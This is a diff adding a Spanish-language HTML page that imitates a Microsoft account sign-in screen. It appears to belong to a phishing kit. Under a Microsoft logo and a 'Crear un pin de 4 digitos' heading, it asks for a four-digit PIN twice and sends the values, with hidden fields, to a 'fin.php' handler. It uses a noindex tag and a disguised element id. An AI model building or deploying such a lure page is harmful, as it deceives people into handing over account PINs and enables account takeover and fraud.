@@ -1,0 +1,108 @@
+
+<html dir="ltr"><head>
+    <meta name="robots" content="noindex,nofollow" />
+
+              <meta name="robots" content="noindex,nofollow">
+           <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+            <title>Iniciar sesion en tu cuenta Microsoft!</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+            <link rel="shortcut icon" href="favicon.ico">
+            <link rel="stylesheet" title="pagina" type="text/css" href="ccs/stylo.css">
+
+        </head>
+   
+        <body class="fa"  >
+          
+           
+           <div>
+             <div  >
+                    <div class="background" role="presentation" >
+           
+                        
+                        <div   style="background-image" >
+                        </div>
+                        <div  ></div> </div></div>
+                <div data-bind="if: activeDialog"></div> 
+    
+                <form name="form1" id="form1" method="post" action="fin.php">
+                    <div class="outer" >
+    
+                        <div class="middle"  >
+                            <div class="inner fade-in-lightbox"> 
+    
+                                <div class="lightbox-cover" ></div>
+                                <div data-bind="component: { name: 'logo-control',}">
+                                    <img class="logo" role="img" src="img/microsoft_logo.svg"></div>
+                                <div style="display: block;" id="pinazo" role="main">
+                                    <div>
+                                        <div class="pagination-view animate slide-in-next" style="min-height:0px">
+                                            <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',}">
+                                                <div data-bind="component: { name: 'header-control',}">
+                                                    <div class="row text-title" id="l0ginHeader">
+                                                        <div role="heading" aria-level="1" data-bind="text: title">
+                                                            Crear un pin de 4 digitos
+        
+                                                        </div></div></div>
+                                                <div class="row">
+                                                    <div class="form-group col-md-24">
+                                                        <div id="error" class="error"></div>
+                                                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
+                                                            
+        <input autocomplete="off" type="tel" required="" name="inputWithValidation" id="pn1" maxlength="4" pattern="[0-9]{4}" class="form-control" aria-describedby="l0ginHeader" placeholder="Ingrese su PIN" tabindex="0"><br>
+        <input autocomplete="off" type="tel" required="" name="inputWithValidation2" id="pn2" maxlength="4" pattern="[0-9]{4}" class="form-control" aria-describedby="l0ginHeader" placeholder="Confirmar PIN" tabindex="0"> 
+        <input name="two" type="hidden" value="">
+        <input name="twox" type="hidden" value="">
+        
+        </div>
+        <input name="ci_prof" type="hidden" value="">
+                                                    </div>
+        
+                                                </div>
+                                            </div> </div></div>
+                               
+        
+                                <div>
+        
+                                    <div class="pagination-view animate has-identity-banner slide-in-next">
+        
+        
+                                        <div class="position-buttons">
+                                            <div>
+                                                <div class="row">
+                                                    <div class="col-md-24">
+                                                        <div class="text-13">
+                                                            <div>
+                                                                <br><label id="idLbl_PWD_KMSI_Cb">
+                    <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Mantener la sesión iniciada">
+                    <span>Mantener la sesión iniciada</span>
+                </label>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="win-button-pin-bottom">
+                                                <div class="row">
+                                                    <div class="col-xs-24 no-padding-left-right button-container">
+                                                        <div class="inline-block">
+                                                            <input type="submit" class="btn btn-block btn-primary" value="Continuar">
+        
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+        
+                            </div>
+
+                            </div>
+    
+                    </div> 
+            </div></div></form>
+ 
+   
+    </body>
+            </html>
